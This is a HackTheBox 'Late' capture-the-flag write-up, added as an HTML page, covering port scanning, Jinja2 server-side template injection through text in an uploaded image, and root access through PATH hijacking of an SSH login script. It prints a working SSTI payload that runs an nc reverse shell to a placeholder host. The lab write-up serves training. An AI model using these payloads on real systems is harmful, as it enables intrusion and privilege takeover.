@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>m4dr1nch</title>
+    <link rel="stylesheet" href="../../assets/css/styles.css">
+    <link rel="stylesheet" href="../assets/css/styles.css">
+	<link rel="shortcut icon" href="../../assets/img/favicon.ico">
+	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.4.0/styles/atom-one-dark.min.css">
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.4.0/highlight.min.js"></script>
+	<script src="../../assets/js/particles.min.js"></script>
+    <script src="../assets/js/app.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+
+<body>
+
+	<header>
+		<h2><a href="../../index.html">HOME</a></h2>
+		<nav>
+			<li><a href="../../index.html#about">About</a></li>
+			<li><a href="../../index.html#projects">Projects</a></li>
+		</nav>
+	</header>
+
+	<section class="hero">
+		<div id='particles-js'></div>
+        <h1>LATE</h1>
+		<h3>HACKTHEBOX MACHINE WRITEUP</h3>
+        <img src="assets/img/lt-logo.png">
+	</section>
+
+	<section class="writeup" id="writeup">
+        <h3 >INTRODUCTION</h3>
+        <p>
+            <a href="https://app.hackthebox.com/machines/Late">Late</a> is an easy CTF-like machine that 
+            you can try to pwn on <a href="https://www.hackthebox.com/">HackTheBox</a>. 
+            It was released on 23 of April 2022 and for completion awards you 20 points. 
+            The focus of this challenge is to pwn a Linux server that hosts a vulnerable web application. 
+            The exploit features a custom SSTI payload delivered in an image format. 
+            After initial access, you can escalate your privileges by abusing an SSH login 
+            tracker script with the ability to write to the PATH.
+        </p>
+        <h3>Initial Access</h3>
+        <h4>Enumeration</h4>
+        <h5>Ports</h5>
+        <p>
+            After connecting to the HackTheBox VPN we can start our enumeration. First 
+            things first we can do a port scan on the machine to see what is running:
+        </p>
+        <pre><code class="language-bash">sudo rustscan --ulimit 5000 -a 10.10.11.156 -- -sC -sV</code></pre>
+        <p>
+            After scanning the machine we find that there are two ports open. One of which 
+            is port 22, running OpenSSH 7.6p1 and the other is port 80 running on nginx 
+            1.14.0. Scan also reveals to us that the target OS is Ubuntu. Scan results:
+        </p>
+        <pre>
+            <code class="language-text">
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
+| ssh-rsa ...
+|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
+| ecdsa-sha2-nistp256 ...
+|   256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
+|_ssh-ed25519 ...
+80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
+|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF
+|_http-title: Late - Best online image tools
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+            </code>
+        </pre>
+        <h5>Webapp</h5>
+        <p>
+            Upon opening the web app we see that this page is a portfolio 
+            for image editing tools. We could start fuzzing for other 
+            directories or subdomains, but let's first explore the website.
+        </p>
+        <img src="assets/img/lt-webapp.jpg">
+        <p>
+            If we scroll down we will find a link that redirects us to a different 
+            subdomain "images.late.htb". We can now add both "images.late.htb" and 
+            "late.htb" to our "/etc/hosts" file using our favorite text editor:
+        </p>
+        <img src="assets/img/lt-hosts.jpg">
+        <p>
+            Now we can visit the newly discovered subdomain. The title of it is 
+            "Image Reader". This tool claims to convert images to text. To do that 
+            it allows us to upload an image file.
+        </p>
+        <img src="assets/img/lt-subdomain.png">
+        <p>
+            Let's try out the functionality. For image creation, I will be using 
+            <a href="https://www.photopea.com/">Photopea</a> which is a free 
+            Photoshop-like image editor that can be run in your browser. I created an 
+            HD image and added text that said "Test 123". Then I exported the image 
+            as JPEG and uploaded it to the site.
+        </p>
+        <img src="assets/img/lt-upload.jpg">
+        <p>
+            The functionality so far works as intended. The output was a text file 
+            that wrapped the text it gathered from the image in paragraph tags. 
+            Can we somehow exploit this?
+        </p>
+        <h4>Exploitation</h4>
+        <h5>Identification</h5>
+        <p>
+            There are a few things that hit this function as being vulnerable. 
+            The first thing is that it is apparently created with a Python flask. 
+            Flask uses a templating engine called Jinja2. If the output to the file 
+            is inserted as a template and not filtered then we can try to perform SSTI 
+            (Server-side template injection) and gain a shell. We can test this theory 
+            by trying to submit an image that has "{{7*7}}" as its payload. Note that 
+            the best font that worked for me was "Azeret Mono".
+        </p>
+        <img src="assets/img/lt-vuln.jpg">
+        <h5>SSTI Exploitation</h5>
+        <p>
+            Now we know that the target is vulnerable. For the exploit, I first need 
+            to find the Popen function within python. To do this I can use the following 
+            line as text in the image:
+        </p>
+        <pre><code class="language-python">{{ ''.__class__.__mro__[1].__subclasses__() }}</code></pre>
+        <p>
+            This will return all of the subclasses. From the output, we can try to locate the Popen subclass. 
+            This can be done by trial and error, or by using sublime-text to find the index. In my case, the index 
+            of Popen is 249. Please note that it might recognize any "5" as an "S" which you can bypass by using "4+1". 
+            In my case that is not needed:
+        </p>
+        <pre><code class="language-python">{{ ''.__class__.__mro__[1].__subclasses__()[249] }}</code></pre>
+        <p>
+            After submitting this image, in the output, we will see the Popen subclass 
+            which we can then later use to execute code on the target.
+        </p>
+        <img src="assets/img/lt-popen.jpg">
+        <p>
+            Now we can try to execute code. For that, I'll use a reverse shell from <a href="https://www.revshells.com/">revshells</a>. 
+            The payload that I will use in the image is the following one:
+        </p>
+        <pre><code class="language-python">{{ ''.__class__.__mro__[1].__subclasses__()[249]("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc &lt;IP&gt; &lt;PORT&gt; >/tmp/f", shell=True, stdout=-1).communicate() }}</code></pre>
+        <p>
+            For the exploit image to work I used the "Azeret Mono" font and the image size that I opted for was 4000x200. 
+            The font size for the payload was 36px which might look small on a 4k pixel strip, but in fact, that is quite 
+            big. Lastly, we can set up our Netcat listener and upload the payload:
+        </p>
+        <img src="assets/img/lt-access.png">
+        <h5>Persistence</h5>
+        <p>
+            Now that we have access to the machine we can set up some persistence. The first thing we see is that we are not 
+            "www-data" but a service account that has a home directory. We know that the machine has SSH open, which means we 
+            can log in via SSH using a key pair. If we explore our home directory more we find that an SSH key has already been 
+            generated which means we can use it to login on a stable SSH connection:
+        </p>
+        <img src="assets/img/lt-ssh.jpg">
+        <p>
+            If getting the reverse shell was unsuccessful then you can try to cat out the 
+            id_rsa located at "/home/svc_acc/.ssh/id_rsa". We can also grab the flag at "/home/svc_acc/user.txt".
+        </p>
+        <h3>Privilege Escalation</h3>
+        <h4>Enumeration</h4>
+        <h5>Exploration</h5>
+        <p>
+            If we run any automatic scripts like PEAS then it will straight away tell us what is exploitable. 
+            If we look at the path we notice that we have two writable directories. One of which has a script 
+            in them:
+        </p>
+        <img src="assets/img/lt-path.jpg">
+        <p>
+            If we look at the file we can see that it is a bash script. It looks to be triggered every time 
+            someone logins or exits SSH. The "ssh-alert.sh" script:
+        </p>
+        <pre>
+            <code class="language-bash">
+#!/bin/bash
+
+RECIPIENT="root@late.htb"
+SUBJECT="Email from Server Login: SSH Alert"
+
+BODY="
+A SSH login was detected.
+
+        User:        $PAM_USER
+        User IP Host: $PAM_RHOST
+        Service:     $PAM_SERVICE
+        TTY:         $PAM_TTY
+        Date:        `date`
+        Server:      `uname -a`
+"
+
+if [ ${PAM_TYPE} = "open_session" ]; then
+        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
+fi
+            </code>
+        </pre>
+        <h4>Exploitation</h4>
+        <h5>Overview</h5>
+        <p>
+            Since we can write to the PATH, then we can try to hijack one of 
+            the binaries that are being run in the script. "sendmail" binary 
+            we cant hijack since it has a full path specified, but we can go 
+            for "date" or "uname" which are run in the BODY of the email before 
+            it is sent. Assuming that the script is run by a higher privilege 
+            user then we can escalate our privileges. First, we can create a 
+            script in the same directory with the name "date" and a reverse 
+            shell in it:
+        </p>
+        <img src="assets/img/lt-create.jpg">
+        <p>
+            Now, all we have to do is set up a Netcat listener and exit the 
+            current SSH shell. This in turn will give us a root shell where 
+            we can grab our flag at "/root/root.txt":
+        </p>
+        <img src="assets/img/lt-root.jpg">
+	</section>
+
+	<footer>
+		<ul>
+			<li><a href="https://github.com/m4dr1nch"><i class="fa fa-github-square"></i></a></li>
+			<li><a href="https://twitter.com/madr1nch"><i class="fa fa-twitter-square"></i></a></li>
+			<li><a href="https://www.linkedin.com/in/m%C4%81rti%C5%86%C5%A1-savickis-232a2020b/"><i class="fa fa-linkedin-square"></i></a></li>
+		</ul>
+		<p>Created by m4dr1nch</p>
+	</footer>
+
+</body>
+</html>
